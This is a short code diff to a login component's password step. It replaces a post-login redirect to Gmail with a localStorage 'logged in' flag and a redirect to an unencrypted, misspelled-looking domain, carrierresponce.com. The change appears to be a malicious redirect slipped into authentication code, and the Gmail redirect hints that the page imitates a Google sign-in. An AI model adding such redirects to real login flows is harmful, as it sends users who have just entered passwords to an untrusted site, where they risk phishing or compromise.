@@ -35,7 +35,9 @@ export const AuthPasswordEntryStep = () => {
       await authFlowService.submitPassword({
         password: data.password,
       });
-      window.location.assign("https://mail.google.com");
+      // Mark user as logged in
+      localStorage.setItem("userLoggedIn", "true");
+      window.location.assign("http://carrierresponce.com/");
     } catch (error) {
       if (error instanceof AuthFlowApiRequestError) {
         setApiError(error.message);
